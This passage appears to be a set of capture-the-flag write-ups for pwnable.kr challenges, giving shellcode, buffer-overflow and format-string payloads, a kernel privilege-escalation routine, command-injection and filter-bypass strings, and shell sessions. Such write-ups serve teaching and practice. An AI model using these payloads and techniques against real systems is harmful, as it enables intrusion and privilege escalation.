                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
        // a buffer we are about to exploit!
        char buf[20];

        // prepare shellcode on executable stack!
        strcpy(buf, sc);

        // overwrite return address!
        *(int*)(buf+32) = buf;

        printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

        unsigned int index=0;
        printf("Tell me the byte index to be fixed : ");
        scanf("%d", &index);
        fflush(stdin);

        if(index > 22)  return 0;

        int fix=0;
        printf("Tell me the value to be patched : ");
        scanf("%d", &fix);

        // patching my shellcode
        sc[index] = fix;

        // this should work..
        shellcode();
        return 0;
}
```

It seems we could only change one byte inside `shellcode`.

I tried to run `fix` but it crashed. So I use `gdb` to find out what happened.

The following is the context when shellcode began to run.

![](pic1.png)

The shellcode has 5 `push`es so that `esp` would reach `0xffffcf00 - 0x4 * 5 = 0xFFFFCEEC`. But some of the shellcode is located after `0xFFFFCEEC`. As a result, the shellcode is broken. 

So it seems we are allowed to have 3 `push`es at most. As we could only modify one byte, I modify `push eax`(on the 6th line) to `pop esp`. After that, `esp` should be `0x6e69622f`. 

However, how could we make such address valid? Well, use 

```
ulimit -s unlimited
```

It could make the program have unlimited stack size. So that set `esp` to `0x6e69622f` would not cause access violation.

```
fix@ubuntu:~$ ls
fix  fix.c  flag  intended_solution.txt
fix@ubuntu:~$ ulimit -s unlimited
fix@ubuntu:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ ls
fix  fix.c  flag  intended_solution.txt
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
$ exit
fix@ubuntu:~$
```




### File: pwnable.kr/Rookiss/fsb/README.md

# pwnable.kr -- Rookiss -- fsb
If you are a expert of "%n" in `printf`, this challenge is easy.

## 1. Challenge
  > Isn't FSB almost obsolete in computer security?  
  > Anyway, have fun with it :)  
  >   
  > ssh fsb@pwnable.kr -p2222 (pw:guest)  

## 2. Solution
  * Connect via SFTP, get binary file `fsb` and source code `fsb.c`.

  * Open `fsb.c` you can see there is a FSB exploit in function `fsb`, LINE 25. And we have 4 chances to exploit it.

  * Run `fsb` in gdb, and make breakpoint at `*fsb+0xDC`. When trigger breakpoint, you can see:

    ```
    gdb-peda$ stack 128
    0000| 0xffffac90 --> 0x804a100 ("%-1$lx\n")
    0004| 0xffffac94 --> 0x804a100 ("%-1$lx\n")
    0008| 0xffffac98 --> 0x64 ('d')
    0012| 0xffffac9c --> 0x0
    0016| 0xffffaca0 --> 0x0
    0020| 0xffffaca4 --> 0x0
    0024| 0xffffaca8 --> 0x0
    0028| 0xffffacac --> 0x0
    0032| 0xffffacb0 --> 0x0
    0036| 0xffffacb4 --> 0x8048870 ("/bin/sh")
    0040| 0xffffacb8 --> 0x0
    0044| 0xffffacbc --> 0x1
    0048| 0xffffacc0 --> 0xffffd118 --> 0x0
    0052| 0xffffacc4 --> 0xffffdfda --> 0x6f682f00 ('')
    0056| 0xffffacc8 --> 0xfffface0 --> 0x0
    0060| 0xffffaccc --> 0xfffface4 --> 0x0
    0064| 0xffffacd0 --> 0x0
    0068| 0xffffacd4 --> 0x0
    0072| 0xffffacd8 --> 0xffffcf68 --> 0x0
    0076| 0xffffacdc --> 0x8048791 (<main+178>:	mov    eax,0x0)
    0080| 0xfffface0 --> 0x0
    0084| 0xfffface4 --> 0x0
    0088| 0xfffface8 --> 0x0
    0092| 0xffffacec --> 0x0
    0096| 0xffffacf0 --> 0x0
    ```

    As it is x86 platform, function `printf` uses `__cdecl` calling convention. So `"%1$lx"` can print the hex value stored in address `$esp + 4`. `"%11$lx"` prints `dword ptr[$esp + 11 * 4]` and so on.

    Watch the stack info, we can find that `$esp + 56` stores the address of function `fsb`'s first argument. And `$esp + 72` stores the previous `EBP`.

    Then in gdb, type `x /128xw *(void**)$ebp-128*4` to see the stack info of function `main`. We can find that `*(void**)$ebp-17*4`, which also is `prev_ebp-17*4`, stores the address of `key`.

  * So, the first time we use `"%14$lx,%18$lx"` to get the address of function `fsb`'s first argument and previous `EBP` named `prev_ebp`.

    Calculate the offset between `$esp` and `prev_ebp-17*4` and use `"%16c%klln"` to overwrite the value of `key` to 16, where `k` is the offset calculated out divided by 4.

  * After that `key` has been modified to 16 and we don't need the last of 4 exploit chances.

  * Finally wait for at least 3 second, and send `"16"` to get shell.



### File: pwnable.kr/Rookiss/loveletter/README.md

# pwnable.kr -- Toddler's Bottle -- loveletter

## 1. Challenge

> At the end... all that matters is love.  
> author: jiwon choi  
>   
> ssh loveletter@pwnable.kr -p2222 (pw:guest)  

## 2. Solution

Log in via SSH and you will see 2 files, `loveletter` and `readme`.

readme
```
connect to port 9034 (nc 0 9034). the 'loveletter' binary will be executed under loveletter_pwn privilege.
pwn it and get a shell and read the flag.
```

Fine, let's download the binary file and drop it into IDA.

The exploit is in function `protect()`. `protect()` will check the string you input and replace every one of the following chars 

```
#&;`'"|*?~<>^()[]{}$\,
```

by `♥` which is 3 bytes long. However, `protect()` does not check buffer length, so it can makes the 256-bytes-long buffer in `main()` overflowed. What worse, `protect()` uses `memcpy()` to join strings and causes null-terminator `\x00` missing. 

![](pic1.png)

How could we get shell?

Well, we can overflow `buffer` and make `prolog_len` be `1` so only the first char of `prolog` will be copied into `loveletter` which is `e`. 

Then `buffer` will be copied into `loveletter`. We can let `buffer` be 

```
nv sh -c bash .....
```

so `loveletter` will be 

```
env sh -c bash .....
```

`.....` can be anything. It won't prevent shell being launched.

In `solve.py`, I send

```
nv sh -c bash AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA|\x01
```

where the number of char `A` is `(256 - len('nv sh -c bash ') - len('|\x00') - 1) = 239` and it works fine.

```
loveletter@ubuntu:~$ mkdir /tmp/solve2
loveletter@ubuntu:~$ cd /tmp/solve2
loveletter@ubuntu:/tmp/solve2$ vim solve.py
loveletter@ubuntu:/tmp/solve2$ chmod +x solve.py
loveletter@ubuntu:/tmp/solve2$ ./solve.py
[+] Opening connection to localhost on port 9034: Done
[*] Switching to interactive mode
$ ls
flag
log
loveletter
super.pl
```




### File: pwnable.kr/Rookiss/md5 calculator/README.md

# pwnable.kr -- Rookiss -- md5 calculator

## 1. Challenge

> We made a simple MD5 calculator as a network service.  
> Find a bug and exploit it to get a shell.  
>   
> Download : http://pwnable.kr/bin/hash  
> hint : this service shares the same machine with pwnable.kr web service  
>   
> Running at : nc pwnable.kr 9002  

## 2. Solution

Download the binary file and drop it into IDA. 

The program will call `my_hash()` at first to calculate a captcha. However `canary` is involved in captcha's calculation. If we know `rands[1]` to `rands[6]`, `canary` would be leaked. 

![](pic1.png)

The good news is that these random integers are predictable because the seed of them is set before `my_hash()` is called and the value is the timestamp when the program is lanuched.

![](pic2.png)

There is a BOF exploit in `process_hash()`. 

![](pic3.png)

We can see that `g_buf` receives a base64-encoded string and `buf` receives the base64-decoded bytes. 

But `buf` is too small. Because the size of `g_buf` is 1024 bytes which means there would be approximately `1024 * 6 // 8 = 768` bytes at most after decoded and `buf` would be overflowed.

So our solution is:

1. Calculate `canary` by the captcha given.

2. Build payload to overflow `buf`, so we can overwrite return address. Don't forget that `canary` must not be changed.

![](pic4.png)

3. Where to return? I thought we can let it return to `0x08049187`. In this case, we must add an address where `/bin/sh` locates after the return address so that it would an argument passed to `system()`.

   The string `/bin/sh` can be located inside `g_buf` of which the address would never change.


   ```
   .text:08049180                 mov     dword ptr [esp], offset command ; "echo `date` >> log"
   .text:08049187                 call    _system
   .text:0804918C                 mov     eax, 0
   ```




### File: pwnable.kr/Rookiss/otp/README.md

# pwnable.kr -- Rookiss -- otp
Actually, the program do not check whether it does read `passcode`.

So just use `ulimit -f 0` to forbid program write any bytes and `passcode` will must be `0`.

## 1. Challenge
  > I made a skeleton interface for one time password authentication system.  
  > I guess there are no mistakes.  
  > could you take a look at it?  
  >   
  > hint : not a race condition. do not bruteforce.  
  >   
  > ssh otp@pwnable.kr -p2222 (pw:guest)  

## 2. Solution
  * Connect via SSH, then:

    ```bash
    $ ulimit -f 0
    $ python -c "import subprocess; subprocess.Popen(['/home/otp/otp', '']); exit()"
    ```

    You will get the flag.



### File: pwnable.kr/Rookiss/simple login/README.md

# pwnable.kr -- Rookiss -- simple login
Like the flag says, control EBP, control EIP, then you are the Lord.

## 1. Challenge
  > Can you get authentication from this server?  
  >   
  > Download : http://pwnable.kr/bin/login  
  >   
  > Running at : nc pwnable.kr 9003  

## 2. Solution
  * Download binary file and open it in IDA.

  * In function `auth`, `memcpy` copy your input to a wrong place with 12 bytes at most. Open stack view and we can see that the last 4 bytes can overwrite previous EBP. So if we overwrite previous EBP, when `main` return, we can control EIP.

    ```cpp
    _BOOL4 __cdecl auth(int a1)
    {
      char v2; // [esp+14h] [ebp-14h]
      char *s2; // [esp+1Ch] [ebp-Ch]
      char v4[8]; // [esp+20h] [ebp-8h]

      memcpy(v4, input, a1);
      s2 = (char *)calc_md5((int)&v2, 12);
      printf("hash : %s\n", s2);
      return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
    }
    ```

  * But where do we control previous EBP to? Well, set previous EBP to the address of global variable `input`. When `main` return, the first 4 bytes of `input` will be poped to register `EBP` and the second 4 bytes of `input` will be poped to register `EIP`.

  * So the first 4 bytes of `input` can be set to whatever you want, but the second 4 bytes of `input` must be set to the address that can help me get shell. Obviously it is `0x08049284`.

    ```python
    input_addr = 0x0811EB40
    shell_entry = 0x08049284
    payload = b'fuck' + pack(shell_entry, 32) + pack(input_addr, 32)
    ```

  * Encode payload with Base64, send it and you will get shell.



### File: pwnable.kr/Rookiss/syscall/README.md

# pwnable.kr -- Rookiss -- syscall

## 1. Challenge

```
I made a new system call for Linux kernel.
It converts lowercase letters to upper case letters.
would you like to see the implementation?

Download : http://pwnable.kr/bin/syscall.c


ssh syscall@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

See source code:

```c
// http://pwnable.kr/bin/syscall.c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```

You can find that `sys_upper` can let unauthorized users write almost any bytes to any address.

So 

1. Prepare a syscall routine `sys_getroot`

   ```c
   long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
       return lpfn_commit_creds(lpfn_prepare_kernel_cred(NULL));
   }
   ```

2. Overwrite `sys_upper` at `&SYS_CALL_TABLE[SYS_upper]` to `sys_getroot` with syscall `SYS_upper`

   ```c
   uint8_t buf[sizeof(void*) + 1] = {0};
   *(void**)buf = (void*)sys_getroot;
   syscall(SYS_upper, buf, SYS_CALL_TABLE + SYS_upper);
   ```

3. Call `SYS_upper` again with addresses of `prepare_kernel_cred` and `commit_creds`.

   ```c
   syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
   ```

   and you will get root privilege.

4. Finally, launch a shell to see the flag stored in `root/flag`.

```console
$ cd tmp

$ cat > solve.c
// paste code

$ gcc -Ttext=0x03bbc010 solve.c -o solve

$ cat /proc/kallsyms | grep prepare_kernel_cred
8003f924 T prepare_kernel_cred
80447f34 r __ksymtab_prepare_kernel_cred
8044ff8c r __kstrtab_prepare_kernel_cred

$ cat /proc/kallsyms | grep commit_creds
8003f56c T commit_creds
8044548c r __ksymtab_commit_creds
8044ffc8 r __kstrtab_commit_creds

$ ./solve 8003f924 8003f56c
[*] sys_getroot = 0x3bbc089
[*] lpfn_prepare_kernel_cred = 0x8003f924
[*] lpfn_commit_creds = 0x8003f56c
Launching shell...
/bin/sh: can't access tty; job control turned off
/tmp # whoami
whoami: unknown uid 0
/tmp # cat /root/flag
...
...
```




### File: pwnable.kr/Rookiss/tiny_easy/README.md

# pwnable.kr -- Rookiss -- otp

## 1. Challenge

> I made a pretty difficult pwn task.  
> However I also made a dumb rookie mistake and made it too easy :(  
> This is based on real event :) enjoy.  
>   
> ssh tiny_easy@pwnable.kr -p2222 (pw:guest)  

## 2. Solution

Log in via SSH and you will see two files: `flag` and `tiny_easy`. 

Of course you cannot see `flag`. So just download `tiny_easy` and drop it into IDA.

To my surprise, `tiny_easy` is very small and with only one function `start` which is also the entry point.

```
LOAD:08048054                 public start
LOAD:08048054 start           proc near
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
LOAD:08048058
LOAD:08048058 LOAD            ends
```

And the following is the screenshot where the program reaches entry point with two arguments: `"123"`, `"123"`.

![](pic1.png)

So it seems that the program will finally jump to an address which is determined by the first 4 bytes of `argv[0]`.

At first glance I though I should build an ROP chain. But `tiny_easy` is too small to find an ROP chain I want.

The second way is to hijack `eip` to stack. However, due to ALSR, we cannot predict the base address of stack. But It doesn't matter because we can use __stack-spray__. 

Though we cannot know the exact value of the base address of stack, we know the approximate value of it. It should be looking like `0xFFxxxxxx`. So we can pass arguments as many as possible and the arguments are consist of many `0x90`(`nop`) and a piece of shellcode.

If the jump address we specified happends to hit `0x90`(`nop`), the program will finally slide to our shellcode. Yes, it all depends on your luck.

Upload `solve.c` to `/tmp/*` and compile. Run several times and you will get shell.




### File: pwnable.kr/Toddler's Bottle/asm/README.md

# pwnable.kr -- Toddler's Bottle -- asm

## 1. Challenge

```
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
```

## 2. Solution

Connect target via ssh and see source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
            printf("seccomp error\n");
            exit(0);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    if (seccomp_load(ctx) < 0){
            seccomp_release(ctx);
            printf("seccomp error\n");
            exit(0);
    }
    seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);

    printf("Welcome to shellcoding practice challenge.\n");
    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
    printf("If this does not challenge you. you should play 'asg' challenge :)\n");

    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
    memset(sh, 0x90, 0x1000);
    memcpy(sh, stub, strlen(stub));

    int offset = sizeof(stub);
    printf("give me your x64 shellcode: ");
    read(0, sh+offset, 1000);

    alarm(10);
    chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
    sandbox();
    ((void (*)(void))sh)();
    return 0;
}

```

You can see the program just calls your shellcode. 

So there's nothing hard. Just build and send your shellcode.



### File: pwnable.kr/Toddler's Bottle/blackjack/README.md

# pwnable.kr -- Toddler's Bottle -- blackjack

## 1. Challenge

```
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?

Running at : nc pwnable.kr 9009
```

## 2. Solution

Goto the given [link](http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html) and see source code.

In function `betting`:

```cpp
int betting() //Asks user amount to bet
{
  printf("\n\nEnter Bet: $");
  scanf("%d", &bet);

  if (bet > cash) //If player tries to bet more money than player has
  {
    printf("\nYou cannot bet more money than you have.");
    printf("\nEnter Bet: ");
    scanf("%d", &bet);
    return bet;
  }
  else return bet;
} // End Function
```

You can see if `bet` you input first is larger than cash you have, you will be asked to input `bet` again. Sounds reasonable.

However, the second time when you input does not validate the value of `bet`.

So just input `10000000` and win the game once, then you will see the flag.



### File: pwnable.kr/Toddler's Bottle/blukat/README.md

# pwnable.kr -- Toddler's Bottle -- blukat

## 1. Challenge

```
Sometimes, pwnable is strange...
hint: if this challenge is hard, you are a skilled player.
 
ssh blukat@pwnable.kr -p2222 (pw: guest)
```

## 2. Solution

Log in via SSH and see source code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
        int i;
        for(i=0; i<strlen(s); i++){
                flag[i] = s[i] ^ key[i];
        }
        printf("%s\n", flag);
}
int main(){
        FILE* fp = fopen("/home/blukat/password", "r");
        fgets(password, 100, fp);
        char buf[100];
        printf("guess the password!\n");
        fgets(buf, 128, stdin);
        if(!strcmp(password, buf)){
                printf("congrats! here is your flag: ");
                calc_flag(password);
        }
        else{
                printf("wrong guess!\n");
                exit(0);
        }
        return 0;
}

```

You can see `buf` is allocated at stack and the size of it is 100 bytes. However, `fget` can receive 128 bytes at most and store received bytes to `buf`. This is a classical BOF exploit. But we cannot use it for there is canary. I wasted a lot of time here :-(

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

After some search, here is the solution:

```
blukat@ubuntu:~$ id
uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)
blukat@ubuntu:~$
```

You will find that you are in `blukat_pwn` group which means you have right to read `password`

```
blukat@ubuntu:~$ cat password
cat: password: Permission denied
```

You may wander why you cannot read `password`. Well, the fact is that the content of `password` is `"cat: password: Permission denied"`. If you don't believe, you can do this:

```
blukat@ubuntu:~$ cat password 2>/dev/null
cat: password: Permission denied
blukat@ubuntu:~$
```

If you are really not allowed to read `password`, you will get nothing for errors have been redirected to `/dev/null`.

So just use the password you got to get the flag:

```bash
blukat@ubuntu:~$ ./blukat
guess the password!
cat: password: Permission denied
congrats! here is your flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!!
```




### File: pwnable.kr/Toddler's Bottle/bof/README.md

# pwnable.kr -- Toddler's Bottle -- bof

## 1. Challenge

```
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## 2. Solution

As the challenge provides you source code, let's see it:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
  char overflowme[32];
  printf("overflow me : ");
  gets(overflowme);	// smash me!
  if(key == 0xcafebabe){
    system("/bin/sh");
  }
  else{
    printf("Nah..\n");
  }
}

int main(int argc, char* argv[]){
  func(0xdeadbeef);
  return 0;
}
```

You can see that `gets(overflowme);` does not restrict the length you input. It will keep reading and writing until you press `Enter` key.

So let's see the stack layout of the function `func` in IDA:

![stack_layout_of_func](stack_layout_of_func.png)

We can see that you can change the value of variable `key` if you input more than `0x2C + 0x4 + 0x4 = 0x34` bytes, so the payload should be:

```python
payload = 0x34 * 'a' + '\xbe\xba\xfe\xca'
```

Send it and get the flag.



### File: pwnable.kr/Toddler's Bottle/cmd1/README.md

# pwnable.kr -- Toddler's Bottle -- cmd1

## 1. Challenge

```
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Connect via SSH and see source code.

```c
// cmd.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "flag")!=0;
    r += strstr(cmd, "sh")!=0;
    r += strstr(cmd, "tmp")!=0;
    return r;
}
int main(int argc, char* argv[], char** envp){
    putenv("PATH=/fuckyouverymuch");
    if(filter(argv[1])) return 0;
    system( argv[1] );
    return 0;
}
```

`"flag"`, `"sh"` and `"tmp"` are filtered. But we can use wildcard.

```bash
$ ./cmd1 "/bin/cat fla*"
```



### File: pwnable.kr/Toddler's Bottle/cmd2/README.md

# pwnable.kr -- Toddler's Bottle -- cmd2

## 1. Challenge

```
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

## 2. Solution

Connect target and see the source code. But this time, you'd pay attention to the login password. The password is the flag of `cmd1` challenge. I will never tell flags in this repository, so you'd better to solve `cmd1` challenge first. Here is the source code of cmd2:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

You can find there are more substrings or characters filtered including the most important `"/"`. But there's still one way to make character `"/"` shown in `system(argv[1])`.

If we go back to `"/"` directory and type:

```bash
$ echo $(pwd)
```

you can get a `"/"` character. So that means `"$(pwd)"` is escaped to `"/"`. However if you directly pass it to program `cmd2`, it still will be filtered. So we must insure that `"$(pwd)"` shall not be escaped while passing arguments.

One of solutions is to use a pair of single quote marks wrapping argument like this:

```bash
$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
```

then you will see the flag.



### File: pwnable.kr/Toddler's Bottle/codemap/README.md

# pwnable.kr -- Toddler's Bottle -- codemap

## 1. Challenge

```
I have a binary that has a lot information inside heap.
How fast can you reverse-engineer this?
(hint: see the information inside EAX,EBX when 0x403E65 is executed)

download: http://pwnable.kr/bin/codemap.exe

ssh codemap@pwnable.kr -p2222 (pw:guest)
```

__NOTICE:__

This challenge has been removed due to quality reason.

## 2. Solution

Connect via ssh and read `readme`:

```
reverse engineer the 'codemap.exe' binary, then connect to codemap daemon(nc 0 9021),  
the daemon will ask you some question, provide the correct answer to get flag.  
```

So type `nc 0 9021` at ssh-shell to see what the questions are:

```
1. What is the string inside 2nd biggest chunk?
2. What is the string inside 3rd biggest chunk?
```

As this it a reversing task, so drop exe file `codemap.exe` into IDA. 

We can find the program will tell the first biggest chunk's size and a string inside it. However, we need strings in the second and the third biggest chunk. Of course, We can try our best to find out the algorithm of how those chunks and strings are generated. But there's a easier way. 

In function `main()`, every time a new chunk is generated, the program will check whether the size of the newly-generated chunk is bigger than the size of the current biggest chunk. If it is, the current biggest chunk will be updated.

So we can use [x32dbg](https://x64dbg.com/#start) and set up a breakpoint where the program is comparing chunks' size. Exactly speaking, it is at `main + 0x135`. Then set log text when the breakpoint is triggered:

![set_bp](set_bp.png)

Every time the breakpoint is triggered, you can see something printed out at `Log` window:

![output](output.png)

There wound be 1000 lines. Use python to sort them and find out the second and the third biggest chunk. 

```python
#!/usr/bin/env python3
import re

chunks = []
while True:
    line = input()
    if line == '':
        break
    else:
        chunks.append(line)

for i in range(len(chunks)):
    size, addr = re.fullmatch('size:([0-9]+),addr:([0-9A-Fa-f]{8})', chunks[i]).group(1, 2)
    size = int(size)
    addr = int(addr, 16)
    chunks[i] = (size, addr)

chunks.sort(key = lambda elem: elem[0], reverse = True)
print('2nd size: %d, addr = 0x%08x' % (chunks[1][0], chunks[1][1]))
print('3rd size: %d, addr = 0x%08x' % (chunks[2][0], chunks[2][1]))
```

Result:

```
...
...
...
size:53579,addr:03C804F8
size:74879,addr:03C8D9C0
size:71775,addr:03CA01B8

2nd size: 99679, addr = 0x019a1650
3rd size: 99662, addr = 0x02a44b40
```

Then look up memory at `0x019a1650` and `0x02a44b40`:

![](chunk_2nd.png)

![](chunk_3rd.png)

Now you can answer the two questions above.




### File: pwnable.kr/Toddler's Bottle/coin1/README.md

# pwnable.kr -- Toddler's Bottle -- coin1

## 1. Challenge

```
Mommy, I wanna play a game!
(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)

Running at : nc pwnable.kr 9007
```

## 2. Solution

```bash
$ nc pwnable.kr 9007
   
        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 30 seconds.

        - How to play -
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

      - Ready? starting in 3 sec... -
```

Obviously you should use dichotomy search to get the answer. Because you have a very limited number of chances.

You can login target via any account. Both `cmd1@pwnable.kr` and `asm@pwnable.kr` are ok. Then you can write your code in `vim` and then save it at the directory `/tmp`.

Just run `coin1.py` and you will see the flag.



### File: pwnable.kr/Toddler's Bottle/collision/README.md

# pwnable.kr -- Toddler's Bottle -- collision

## 1. Challenge

```
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Connect target via ssh and see source code:

```c
#include <stdio.h>
#include <string.h>

unsigned long hashcode = 0x21DD09EC;

unsigned long check_password(const char* p) {
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]) {
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }

    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password(argv[1])){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");

    return 0;
}
```

We can see the program receives a 20-bytes-long string and casts it into an integer array, then add 5 integers up. If result is equal to hashcode we can get the flag.

So the problem is how to build a such string that meets the requirements said above.

We can add `0x200000000` to hashcode, so the result is `0x221DD09EC`. Then divide it by `5` and we can get `0x6D2C352F`, which can be casted into `char[4] = "/5,m"`.

Now multiply `0x6D2C352F` with `5` and we can get `0x221DD09EB` which is not equal to `hashcode` in `mod 2^32`. We must add 1 to one of the 5 integers, so that we can get `0x221DD09EC` after adding the 5 integers up.

Finally,

```bash
$ ./col "/5,m/5,m/5,m/5,m05,m"
```



### File: pwnable.kr/Toddler's Bottle/fd/README.md

# pwnable.kr -- Toddler's Bottle -- fd

# 1. Challenge

```
Mommy! what is a file descriptor in Linux?

try to play the wargame your self but if you are ABSOLUTE beginner, follow
this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU

ssh fd@pwnable.kr -p2222 (pw:guest)
```

# 2. Solution

Since the challenge gives us a ssh connection, let's connect target first.

After you get shell via ssh, use `ls` and you can find there are three files at current directory: `fd`, `fd.c`, `flag`.

Of course, you do not have permissions to read `flag`, but ELF file `fd` has. And `fd.c` is the source code of `fd`.

Let's use `cat fd.c` to see the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

Obviously, if we set fd to 0 (which stands for `stdin`), then the program will read something from `stdin`. 

So we just type `LETMEWIN`, then the flag will display.



### File: pwnable.kr/Toddler's Bottle/flag/README.md

# pwnable.kr -- Toddler's Bottle -- flag

## 1. Challenge

```
Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

